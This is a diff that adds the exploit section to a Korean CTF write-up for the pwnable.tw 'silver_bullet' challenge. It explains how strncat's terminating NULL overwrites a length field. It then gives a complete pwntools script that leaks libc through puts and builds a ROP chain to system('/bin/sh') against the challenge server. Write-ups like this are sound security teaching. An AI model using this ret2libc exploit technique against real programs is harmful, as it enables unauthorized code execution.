@@ -14,7 +14,7 @@ comments: true
 ```
 main은 단순히 옵션 선택이며 히든 옵션은 없습니다.
 
-```
+```c
 char s; // [esp+8h] [ebp-34h]
 int v8; // [esp+38h] [ebp-4h]
 .
@@ -122,7 +122,95 @@ if ( beat(&s, &v5) )
 
 ### Exploit
 
+취약점은 strncat과 power up()에서 power을 처리할 때 발생합니다.
 
+Create bullet시 47 바이트를 입력하면 Power up시 1 바이트를 입력하는데, strncat으로 47 바이트 뒤에 1 바이트를 strncat하면
+
+뒤에 NULL이 따라 붙기 때문에 47 + 1 바이트가 버퍼를 채우고 NULL이 power을 덮게 됩니다.
+
+strncat후 power이 0x00으로 덮인 상태에서
+```
+strncat(dest, &s, 48 - *(dest + 12));
+v3 = strlen(&s) + *(dest + 12);
+printf("Your new power is : %u\n", v3);
+*(dest + 12) = v3;
+```
+위와 같이 원래 power을 따로 보관하지 않는다는 소스의 허점때문에 결국 power는 새로 입력한 데이터의 길이인 0x01이 됩니다.
+
+그렇게 되면 다음번 power up시 48 - 1 = 47 바이트를 버퍼 뒤에 이어 입력할 수 있게 되기에 power와 main의 eip를 조작할 수 있습니다.
+
+따라서 puts로 libc를 leak하고 main loop으로 다시 ROP를 진행하면 쉘 취득이 가능합니다.
+
+exp.py
+```python
+from pwn import *
+
+def create(payload):
+	p.recvuntil('Your choice :')
+	p.sendline('1')
+	p.recvuntil('description of bullet :')
+	p.send(payload)
+
+def up(payload):
+	p.recvuntil('Your choice :')
+	p.sendline('2')
+	p.recvuntil('another description of bullet :')
+	p.send(payload)
+
+def beat():
+	p.recvuntil('Your choice :')
+	p.sendline('3')
+	p.recvuntil('!!\n')
+
+#p = process('./silver_bullet')
+p = remote('chall.pwnable.tw', 10103)
+e = ELF('./silver_bullet')
+l = ELF('libc_32.so.6')
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+
+main = 0x08048954
+
+offset_puts = l.symbols['puts']
+#offset_puts = 0x5fca0 # local
+offset_system = l.symbols['system']
+#offset_system = 0x3ada0 # local
+offset_binsh = next(l.search('/bin/sh'))
+#offset_binsh = 0x15ba0b # local
+
+# Stage 1 : libc leak
+
+create('A' * 47)
+up('A')
+
+payload = '\xff'* 7
+payload += p32(puts_plt) + p32(main) + p32(puts_got)
+
+up(payload)
+beat()
+
+libc = u32(p.recv(4)) - offset_puts
+system = libc + offset_system
+binsh = libc + offset_binsh
+
+log.info('libc base : ' + str(hex(libc)))
+
+# Stage 2 : ROP
+
+create('A' * 47)
+up('A')
+
+payload = '\xff' * 7
+payload += p32(system) + 'AAAA' + p32(binsh)
+
+up(payload)
+beat()
+
+p.interactive()
+```
+
+![shell](https://t1.daumcdn.net/cfile/tistory/997AA93C5BE4228002)
 
 
 
